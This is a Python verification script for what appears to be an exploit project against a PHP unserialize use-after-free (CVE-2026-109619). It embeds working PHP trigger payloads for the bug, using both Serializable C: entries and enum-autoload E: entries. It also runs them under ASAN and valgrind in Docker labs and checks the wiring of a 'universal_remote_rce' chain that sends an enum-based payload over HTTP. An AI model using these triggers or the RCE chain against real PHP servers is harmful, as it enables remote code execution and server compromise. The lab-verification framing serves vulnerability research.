#!/usr/bin/env python3
"""Verifier for enum_trigger.py (CVE-2026-109619 / GH-23981). Proves on local
labs that the E: enum-autoload rule reaches the identical var_hash UAF as the
C:/Serializable trigger, and validates the chain wiring: (0) pure-python wiring
check of patch_remote_rce, (1) a var_hash-sharing correctness oracle on 8.4.26/8.5.11/
8.5.12 CLI, (2) an ASAN check that E: and C: free the same 320-byte region at
the same dangling-read offset, (3) a best-effort valgrind check on 8.5.x. All
PHP harnesses are project-written. Pure stdlib, safe under python3 -I.

    python3 -I poc/chains/verify_enum_trigger.py [--no-valgrind]
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import tempfile

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import universal_remote_rce as remote_rce
import enum_trigger as et

from common.asan_diff import run_asan

ASAN_IMAGE = "php2shell-cli-asan:latest"


# PHP harnesses (authored by this project)
ORACLE_PHP = r'''<?php
error_reporting(0);
echo "VER=".PHP_VERSION."\n";
class P2SCheckC implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void { $GLOBALS['c']=unserialize($data); }
}
$innerC='O:8:"stdClass":1:{s:1:"a";s:6:"nested";}'; $cn='P2SCheckC';
$pC='a:3:{i:0;C:'.strlen($cn).':"'.$cn.'":'.strlen($innerC).':{'.$innerC.'}'
   .'i:1;O:8:"stdClass":1:{s:1:"a";s:5:"outer";}i:2;r:3;}';
$vC=@unserialize($pC);
echo "C=".((is_array($vC)&&is_object($vC[2]??null)&&(($vC[2]->a??'')==='nested'))?"SHARE":"no")."\n";
if (PHP_VERSION_ID>=80100){
    spl_autoload_register(function($class){
        $GLOBALS['e']=unserialize('O:8:"stdClass":1:{s:1:"a";s:6:"nested";}');
        eval("enum $class { case On; }");
    });
    $en='P2Lazy:On';
    $vE=@unserialize('a:3:{i:0;E:'.strlen($en).':"'.$en.'";i:1;O:8:"stdClass":1:{s:1:"a";s:5:"outer";}i:2;r:3;}');
    echo "E=".((is_array($vE)&&is_object($vE[2]??null)&&(($vE[2]->a??'')==='nested'))?"SHARE":"no")."\n";
} else { echo "E=na\n"; }
'''

_INNER8 = ('O:8:"stdClass":8:{s:2:"p0";i:1;s:2:"p1";i:2;s:2:"p2";i:3;s:2:"p3";i:4;'
           's:2:"p4";i:5;s:2:"p5";i:6;s:2:"p6";i:7;s:2:"p7";i:8;}')

UAF_C_PHP = r'''<?php
error_reporting(0);
class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void { unserialize($data)->x = 0; }
}
$inner='%s';
$cpart='C:10:"CachedData":'.strlen($inner).':{'.$inner.'}';
$parts='i:0;'.$cpart; for($k=0;$k<8;$k++){ $parts.='i:'.($k+1).';R:'.(4+$k).';'; }
@unserialize('a:9:{'.$parts.'}'); echo "done\n";
''' % _INNER8

UAF_E_PHP = r'''<?php
error_reporting(0);
$inner='%s';
spl_autoload_register(function($class) use ($inner){
    unserialize($inner)->x = 0;
    eval("enum $class { case On; }");
});
$en='P2Lazy:On';
$parts='i:0;E:'.strlen($en).':"'.$en.'";'; for($k=0;$k<8;$k++){ $parts.='i:'.($k+1).';R:'.(4+$k).';'; }
@unserialize('a:9:{'.$parts.'}'); echo "done\n";
''' % _INNER8


# docker helpers
def _run(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace") + r.stderr.decode("utf-8", "replace")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        return -1, "[exec error: %r]" % e


def _running_containers():
    rc, out = _run(["docker", "ps", "--format", "{{.Names}}"], timeout=30)
    return [l.strip() for l in out.splitlines() if l.strip()] if rc == 0 else []


def _find_by_version(prefix):
    """Return (name, version) for a running container whose PHP matches prefix."""
    for name in _running_containers():
        rc, out = _run(["docker", "exec", name, "php", "-v"], timeout=20)
        if rc != 0:
            continue
        first = out.splitlines()[0] if out else ""
        if first.startswith("PHP " + prefix):
            return name, first.split()[1]
    return None, None


def _exec_php(container, php_src):
    with tempfile.NamedTemporaryFile("w", suffix=".php", delete=False) as f:
        f.write(php_src)
        local = f.name
    try:
        dst = "/tmp/_v_%d.php" % os.getpid()
        rc, _ = _run(["docker", "cp", local, "%s:%s" % (container, dst)], timeout=30)
        if rc != 0:
            return -1, "[cp failed]"
        return _run(["docker", "exec", container, "php", dst], timeout=60)
    finally:
        try:
            os.unlink(local)
        except OSError:
            pass


def _asan_run(php_src, env=None):
    return run_asan(php_src, ASAN_IMAGE,
                    env={"USE_ZEND_ALLOC": "0",
                         "ASAN_OPTIONS": "detect_leaks=0:abort_on_error=0"})


def _valgrind_run(container, php_src):
    # ensure valgrind present (best-effort install; needs apt/network)
    rc, _ = _run(["docker", "exec", container, "sh", "-c", "command -v valgrind"], timeout=20)
    if rc != 0:
        rc2, _ = _run(["docker", "exec", container, "sh", "-c",
                       "apt-get update -qq >/dev/null 2>&1; "
                       "apt-get install -y -qq valgrind >/dev/null 2>&1; command -v valgrind"],
                      timeout=180)
        if rc2 != 0:
            return None  # unavailable -> skip
    with tempfile.NamedTemporaryFile("w", suffix=".php", delete=False) as f:
        f.write(php_src)
        local = f.name
    try:
        dst = "/tmp/_vg_%d.php" % os.getpid()
        rc, _ = _run(["docker", "cp", local, "%s:%s" % (container, dst)], timeout=30)
        if rc != 0:
            return None
        return _run(["docker", "exec", "-e", "USE_ZEND_ALLOC=0", container,
                     "valgrind", "-q", "/usr/local/bin/php", dst], timeout=180)[1]
    finally:
        try:
            os.unlink(local)
        except OSError:
            pass


# phases
def phase0_wiring():
    print("\n[0] a7-chain wiring (pure python)")
    ok = True
    tok = et.enum_entry_token()
    print("    E: entry token =", tok)
    ok &= (tok == 'E:9:"P2Lazy:On";')
    ok &= (et.INNER_G == remote_rce.INNER)  # g= inner is byte-identical to the engine's inner
    print("    INNER_G == a7.INNER :", et.INNER_G == remote_rce.INNER)
    et.patch_remote_rce("127.0.0.1", 80, "/enum.php")
    print("    after patch_a7: a7.C_PART =", remote_rce.C_PART)
    ok &= remote_rce.C_PART.startswith('E:')
    ok &= (remote_rce.send_http is et._enum_send_http)
    g = et.g_param_bytes()
    print("    g= field =", g.decode("latin-1")[:48], "...")
    ok &= g.startswith(b"g=")
    et.unpatch_remote_rce()
    ok &= remote_rce.C_PART.startswith('C:')  # restored
    print("    -> %s" % ("PASS" if ok else "FAIL"))
    return ok


def phase1_oracle():
    print("\n[1] var_hash-sharing oracle (E: leaks like C:)")
    ok_any = False
    all_ok = True
    for pref in ("8.4.26", "8.5.11", "8.5.12"):
        name, ver = _find_by_version(pref)
        if not name:
            print("    %-7s : no running container (skipped)" % pref)
            continue
        rc, out = _exec_php(name, ORACLE_PHP)
        cshare = "C=SHARE" in out
        eshare = "E=SHARE" in out
        good = cshare and eshare
        all_ok &= good
        ok_any |= good
        print("    %-7s (%s): C=%s E=%s -> %s"
              % (pref, name, "SHARE" if cshare else "no",
                 "SHARE" if eshare else "no", "PASS" if good else "FAIL"))
    if not ok_any:
        print("    -> FAIL (no container confirmed the E: share)")
    return ok_any and all_ok


def phase2_asan():
    print("\n[2] ASAN UAF grounding on 8.4.26 (E: == C:, distinct reentry)")
    rc, out_e = _asan_run(UAF_E_PHP)
    rc, out_c = _asan_run(UAF_C_PHP)
    def has(s, *subs):
        return all(x in s for x in subs)
    # Common UAF fingerprint (both branches):
    common_e = has(out_e, "heap-use-after-free", "var_unserializer.re:910",
                   "zend_hash_do_resize", "320-byte region", "72 bytes inside")
    common_c = has(out_c, "heap-use-after-free", "var_unserializer.re:910",
                   "zend_hash_do_resize", "320-byte region", "72 bytes inside")
    # Distinct reentry path to the free:
    e_path = has(out_e, "spl_perform_autoload", "var_unserializer.re:1387")
    c_path = has(out_c, "zend_user_unserialize", "var_unserializer.re:1291")
    # Negative cross-check: each branch must NOT show the other's reentry rule.
    e_clean = "zend_user_unserialize" not in out_e
    c_clean = "spl_perform_autoload" not in out_c
    print("    E: common-UAF fingerprint     :", common_e)
    print("    C: common-UAF fingerprint     :", common_c)
    print("    E: via spl_perform_autoload   :", e_path, "(re:1387)")
    print("    C: via zend_user_unserialize  :", c_path, "(re:1291)")
    print("    reentry paths are distinct    :", e_clean and c_clean)
    ok = common_e and common_c and e_path and c_path and e_clean and c_clean
    print("    -> %s" % ("PASS" if ok else "FAIL"))
    return ok


def phase3_valgrind(enabled):
    print("\n[3] valgrind UAF grounding on 8.5.11 + 8.5.12 (best-effort)")
    if not enabled:
        print("    (disabled by --no-valgrind)")
        return None
    results = []
    for pref in ("8.5.11", "8.5.12"):
        name, ver = _find_by_version(pref)
        if not name:
            print("    %-7s : no running container (skipped)" % pref)
            continue
        out = _valgrind_run(name, UAF_E_PHP)
        if out is None:
            print("    %-7s (%s): valgrind unavailable (skipped)" % (pref, name))
            continue
        hit = ("Invalid read" in out and "72 bytes inside a block of size 320 free'd" in out)
        results.append(hit)
        print("    %-7s (%s): E: invalid-read 72/320 -> %s"
              % (pref, name, "PASS" if hit else "FAIL"))
    if not results:
        print("    -> SKIPPED (valgrind unavailable everywhere)")
        return None
    return all(results)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--no-valgrind", action="store_true")
    args = ap.parse_args()

    print("=" * 68)
    print("verify a7_enum_trigger: E: enum-autoload second trigger for a7 UAF")
    print("=" * 68)

    p0 = phase0_wiring()
    p1 = phase1_oracle()
    p2 = phase2_asan()
    p3 = phase3_valgrind(not args.no_valgrind)

    print("\n" + "=" * 68)
    print("  [0] wiring       :", "PASS" if p0 else "FAIL")
    print("  [1] oracle       :", "PASS" if p1 else "FAIL")
    print("  [2] ASAN UAF     :", "PASS" if p2 else "FAIL")
    print("  [3] valgrind UAF :", ("PASS" if p3 else "FAIL") if p3 is not None else "SKIPPED")
    mandatory = [p0, p1, p2]
    ok = all(mandatory) and (p3 is not False)  # valgrind may skip, must not fail
    print("=" * 68)
    print("RESULT:", "GREEN" if ok else "RED")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
